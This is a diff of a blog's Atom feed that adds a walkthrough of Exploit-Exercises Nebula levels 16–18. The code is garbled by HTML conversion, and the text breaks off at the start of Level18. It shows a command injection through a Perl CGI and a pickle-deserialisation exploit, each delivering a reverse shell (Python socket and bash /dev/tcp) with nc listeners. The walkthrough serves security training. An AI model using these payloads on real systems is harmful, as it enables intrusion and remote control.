@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vulnhub | 0x73696e65]]></title>
   <link href="http://73696e65.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-06-19T19:51:58+02:00</updated>
+  <updated>2015-06-22T23:21:00+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,6 +12,1071 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit-Exercises: Nebula (16-19)]]></title>
+    <link href="http://73696e65.github.io/blog/2015/06/20/exploit-exercises-nebula-16-19/"/>
+    <updated>2015-06-20T11:51:41+02:00</updated>
+    <id>http://73696e65.github.io/blog/2015/06/20/exploit-exercises-nebula-16-19</id>
+    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>
+
+<h2>Level16</h2>
+
+<p>There is a perl script running on port 1616, source:</p>
+
+<p><figure class='code'><figcaption><span>index.pl </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="o">!</span><span class="sr">/usr/</span><span class="n">bin</span><span class="sr">/env perl&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Content</span><span class="o">-</span><span class="n">type:</span> <span class="n">text</span><span class="sr">/html\n\n&amp;rdquo;;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">sub </span><span class="nf">login</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$</span><span class="err">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span><span class='line'>  <span class="nv">$password</span> <span class="o">=</span> <span class="vg">$&lt;</span><span class="sr">/em&gt;[1];&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="nv">$username</span> <span class="o">=~</span> <span class="nb">tr</span><span class="sr">/a-z/</span><span class="n">A</span><span class="o">-</span><span class="n">Z</span><span class="o">/</span><span class="p">;</span> <span class="c1"># conver to uppercase</span>
+</span><span class='line'>  <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>        <span class="c1"># strip everything after a space&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="nv">@output</span> <span class="o">=</span> <span class="sr">&lt;code&gt;</span><span class="n">egrep</span> <span class="s">&quot;^$username&quot;</span> <span class="sr">/home/</span><span class="n">flag16</span><span class="sr">/userdb.txt 2&amp;gt;&amp;amp;1&lt;/co</span><span class="n">de</span><span class="o">&gt;</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="p">(</span><span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pw</span><span class="p">)</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/:/</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;pre&gt;&lt;code&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="nv">$pw</span> <span class="o">=~</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="sr">&lt;/code&gt;&lt;/pre&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="p">}</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">sub </span><span class="nf">htmlz</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="sr">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span><span class="n">Login</span> <span class="n">resuls</span><span class="sr">&lt;/title&gt;&lt;/head&gt;&lt;body&gt;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Your</span> <span class="n">login</span> <span class="n">was</span> <span class="n">accepted</span><span class="sr">&lt;br/&gt;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Your</span> <span class="n">login</span> <span class="n">failed</span><span class="sr">&lt;br/&gt;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>  <span class="p">}</span>  <span class="sr">&lt;br/&gt;</span>
+</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Would</span> <span class="n">you</span> <span class="n">like</span> <span class="n">a</span> <span class="n">cookie</span><span class="p">?</span><span class="sr">&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;</span><span class="o">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'><span class="p">}</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="n">htmlz</span><span class="p">(</span><span class="n">login</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">username</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;),</span> <span class="n">param</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">password</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)));</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>The service is running with flag16 privileges:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ ps auxww | grep [f]lag16
+</span><span class='line'>flag16    1314  0.0  0.3   2592   836 ?        Ss   Jun18   0:01 /usr/sbin/thttpd -C /home/flag16/thttpd.conf</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Clearly, there is RCE vulnerability (line 14), we can check it creating an arbitrary file:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ wget -q -O /dev/null &ldquo;&lt;a href="http://192.168.80.136:1616/index.cgi?username=%24">http://192.168.80.136:1616/index.cgi?username=%24&lt;/a>(>abcd)&amp;password=x&rdquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ ls -l /home/flag16/ABCD
+</span><span class='line'>-rw-rw-r&ndash; 1 flag16 flag16 0 2015-06-21 00:16 /home/flag16/ABCD</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Only problem is that input is uppercased and everything after whitespace character is stripped:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="nv">$username</span> <span class="o">=~</span> <span class="nb">tr</span><span class="sr">/a-z/</span><span class="n">A</span><span class="o">-</span><span class="n">Z</span><span class="o">/</span><span class="p">;</span> <span class="c1"># conver to uppercase</span>
+</span><span class='line'><span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>    <span class="c1"># strip everything after a space&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We tried several other methods without success. In the later case, the shell runs, but we cannot do anything useful:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.136:1616/index.cgi?username=$">http://192.168.80.136:1616/index.cgi?username=$&lt;/a>(CMD=YES;${CMD~~})&amp;password
+</span><span class='line'>&lt;a href="http://192.168.80.136:1616/index.cgi?username=$">http://192.168.80.136:1616/index.cgi?username=$&lt;/a>($SHELL)&amp;password</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Our solution was to create uppercased file in /tmp/ and use * expansion, telling bash to find the correct directory.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ cat SH
+</span><span class='line'>python -c &ldquo;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo; nebula 1337&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ chmod +x SH&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ nc -l 1337&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>&lt;a href="http://192.168.80.136:1616/index.cgi?username=$">http://192.168.80.136:1616/index.cgi?username=$&lt;/a>(/*/SH)&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ wget -q -O /dev/null &ldquo;&lt;a href="http://192.168.80.136:1616/index.cgi?username=%24">http://192.168.80.136:1616/index.cgi?username=%24&lt;/a>(/%2A/SH)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>flag16@nebula:/home/flag16$ getflag
+</span><span class='line'>getflag
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>
+
+<h2>Level17</h2>
+
+<p><figure class='code'><figcaption><span>level17.py </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">pickle</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">signal</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_IGN</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">server</span><span class="p">(</span><span class="n">skt</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">clnt</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">why</span> <span class="n">did</span> <span class="n">you</span> <span class="n">send</span> <span class="n">me</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="err">?</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">skt</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'><span class="n">skt</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">10007</span><span class="p">))</span>
+</span><span class='line'><span class="n">skt</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>  <span class="n">clnt</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
+</span><span class='line'>      <span class="n">clnt</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Accepted</span> <span class="n">connection</span> <span class="kn">from</span> <span class="o">%</span><span class="n">s</span><span class="p">:</span><span class="o">%</span><span class="n">d</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+</span><span class='line'>      <span class="n">server</span><span class="p">(</span><span class="n">clnt</span><span class="p">)</span>
+</span><span class='line'>      <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>According <a href="https://docs.python.org/2/library/pickle.html">documentation</a> it is
+not safe to use data from untrusted source, so <code>pickle.loads</code> on line 14 means RCE:</p>
+
+<p><code>Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</code></p>
+
+<p>Our exploit for executing remote shell:</p>
+
+<p><figure class='code'><figcaption><span>exploit.py </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">cPickle</span> <span class="kn">import</span> <span class="n">dumps</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">os</span>      <span class="kn">import</span> <span class="n">system</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">class</span> <span class="nc">Exploit</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span><span class='line'>    <span class="k">def</span> <span class="err">&lt;</span><span class="nf">strong</span><span class="o">&gt;</span><span class="nb">reduce</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span> <span class="k">return</span> <span class="p">(</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">1337</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="n">amp</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">())</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>Window 1:&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ nc -l 1337&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>Window 2:&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ ./exploit.py
+</span><span class='line'>cposix
+</span><span class='line'>system
+</span><span class='line'>p1
+</span><span class='line'>(S'bash -i >&amp; /dev/tcp/0.0.0.0/1337 0>&amp;1'
+</span><span class='line'>p2
+</span><span class='line'>tp3
+</span><span class='line'>Rp4
+</span><span class='line'>.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh-4.2$ ./exploit.py | nc nebula 10007
+</span><span class='line'>Accepted connection from 127.0.0.1:42532&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>Window 1:&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>bash: no job control in this shell
+</span><span class='line'>flag17@nebula:/$ getflag
+</span><span class='line'>getflag
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>
+
+<h2>Level18</h2>
+
+<p>According challenge info, there are several ways how to solve this challenge.</p>
+
+<p><figure class='code'><figcaption><span>level18.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
